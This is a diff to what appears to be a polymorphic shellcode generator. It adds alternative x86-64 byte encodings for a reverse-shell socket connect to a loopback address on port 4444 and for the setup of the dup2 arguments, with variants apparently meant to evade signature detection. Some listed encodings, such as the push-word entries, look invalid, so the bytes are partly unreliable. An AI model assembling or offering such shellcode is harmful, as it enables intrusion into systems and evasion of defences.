@@ -44,13 +44,69 @@ create_socket_6 = ["4831D2", "4D31C04C89C2", "B20180EA01"]
 
 create_socket_syscall = ["0F05"]
 
+#mov r9, rax -> 4989C1
+
+create_socket_mov = ["4989C1"]
+
+
 
 ###### CONNEXION SOCKET ######
 
+#push 0x2A -> 6A2A
+
+connexion_socket_1 = ["6A2A"]
+
+#pop rax -> 58
+
+connexion_socket_2 = ["58"]
+
+#mov rdi, r9 -> 4C89CF
+
+connexion_socket_3 = ["4C89CF"]
+
+#push rdx -> 52
+#push rdx -> 52
+
+connexion_socket_4 = ["5252"]
+
+#push 0x0101017f -> 687F010101
+
+connexion_socket_5 = ["687F010101"]
+
+#push word 0x5c11 -> D05C11
+
+connexion_socket_6 = ["D05C11"]
 
 
+#push word 0x02 -> D002
 
+connexion_socket_7 = ["D002"]
 
+#mov rsi, rsp -> 4889E6
+# xor r8, r8 - mov r8, rsp - mov rsi, r8 -> 4D31C04989E04C89C6
+#xor r9, r9 - mov r9, rsp - mov rsi, r9 -> 4D31C94989E14C89CE
+
+connexion_socket_8 = ["4889E6", "4D31C04989E04C89C6", "4D31C94989E14C89CE"]
+
+#add rdx, 0x10 -> 4883C210
+
+connexion_socket_9 = ["4883C210"]
+
+#syscall -> 0F05
+
+connexion_socket_10 = ["0F05"]
+
+#xor rsi, rsi -> 4831F6
+#xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6
+# mov sil, 1 - sub sil, 1 -> 40B6014080EE01
+
+connexion_socket_11 = ["4831F6", "4D31C04C89C6", "40B6014080EE01"]
+
+#mov sil, 2 -> 40B602
+#xor r8, r8 - mov r8b, 2 - mov sil, r8b -> 4D31C041B0024488C6
+#xor r9, r9 - mov r9b, 2 - mov sil, r9b -> 4D31C941B1024488CE
+
+connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 
 ###### LOOP ######
 
